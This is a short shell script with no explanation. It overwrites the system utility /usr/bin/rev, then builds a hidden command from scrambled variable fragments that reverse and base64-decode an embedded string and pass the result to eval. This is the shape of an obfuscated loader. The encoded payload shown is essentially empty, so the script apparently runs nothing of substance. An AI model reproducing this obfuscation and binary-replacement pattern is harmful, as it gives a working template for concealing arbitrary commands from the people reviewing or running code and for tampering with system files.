cat << 'EOF' > /usr/bin/rev
#!/bin/sh
while read line; do
    echo "$line" | awk '{ for (i=length; i>0; i--) printf substr($0,i,1); print "" }'
done
EOF

chmod +x /usr/bin/rev

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
